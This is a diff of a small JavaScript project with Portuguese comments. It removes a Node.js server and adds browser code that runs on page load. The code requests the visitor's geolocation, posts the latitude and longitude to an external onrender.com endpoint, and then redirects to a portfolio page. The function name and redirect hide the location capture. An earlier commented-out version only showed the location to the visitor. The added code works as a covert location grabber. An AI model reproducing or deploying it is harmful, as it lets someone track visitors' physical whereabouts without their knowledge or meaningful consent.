@@ -1,38 +1,3 @@
-const http = require('http');
-const querystring = require('querystring');
-
-function createServer() {
-    // Exemplo de dados
-    let data = [];
-
-    const server = http.createServer((req, res) => {
-        if (req.url === '/api/locations' && req.method === 'POST') {
-            let body = '';
-
-            req.on('data', chunk => {
-                body += chunk;
-            });
-
-            req.on('end', () => {
-                const newLocation = JSON.parse(body);
-                data.push(newLocation);
-                res.writeHead(201, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify(newLocation));
-            });
-        } else {
-            res.writeHead(404, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ message: 'Route not found' }));
-        }
-    });
-
-    const PORT = process.env.PORT || 3000;
-    server.listen(PORT, () => {
-        console.log(`Server is running on port ${PORT}`);
-    });
-}
-
-// Chamada da função para iniciar o servidor
-createServer();
 
 let sites = ['leandrocmore.github.io/portifolio'];
 
@@ -49,8 +14,12 @@ function success(position) {
     let latitude = coords.latitude;
     let longitude = coords.longitude;
 
-    // Enviar dados para a API via método POST
+    // Enviar dados para a API via método POST usando fetch
     enviarDadosParaAPI(latitude, longitude);
+
+
+    let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
+    window.location.href = siteAleatorio;
 }
 
 function enviarDadosParaAPI(latitude, longitude) {
@@ -59,33 +28,62 @@ function enviarDadosParaAPI(latitude, longitude) {
         longitude: longitude
     };
 
-    const postData = querystring.stringify(data);
-
-    const options = {
-        hostname: 'https://cacagolp2-5.onrender.com/api/', // Altere para o seu host
-        port: 8000, 
-        path: 'data/',
+    fetch('https://cacagolp2-5.onrender.com/api/data/', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Content-Length': Buffer.byteLength(postData)
-        }
-    };
-
-    const req = http.request(options, (res) => {
-        console.log(`Status da requisição: ${res.statusCode}`);
-        
-        res.on('data', (chunk) => {
-            console.log(`Corpo da resposta: ${chunk}`);
-        });
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        console.log('Status da requisição:', response.status);
+        return response.json();
+    })
+    .then(data => {
+        console.log('Corpo da resposta:', data);
+    })
+    .catch(error => {
+        console.error('Ocorreu um erro na requisição:', error);
     });
-
-    req.on('error', (error) => {
-        console.error(`Ocorreu um erro na requisição: ${error}`);
-    });
-
-    req.write(postData);
-    req.end();
 }
 
 redirecionarParaSiteAleatorio();
+
+
+
+
+
+
+
+
+
+/*
+
+let sites = ['leandrocmore.github.io/portifolio',];
+
+function redirecionarParaSiteAleatorio() {
+    obterLocalizacao(); 
+
+
+
+}
+
+function obterLocalizacao() {
+    navigator.geolocation.getCurrentPosition(success, error);
+}
+
+function success(position) {
+    let { coords } = position;
+        locationResult.textContent = 'Veja sua Localização ';
+        locationResult.innerHTML = `<a href="https://www.openstreetmap.org?mlat=${coords.latitude}&mlon=${coords.longitude}">Ver Localização no Mapa</a>`;
+    
+
+
+    
+    let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
+    window.location.href = siteAleatorio;
+}
+
+
+
+redirecionarParaSiteAleatorio();*/
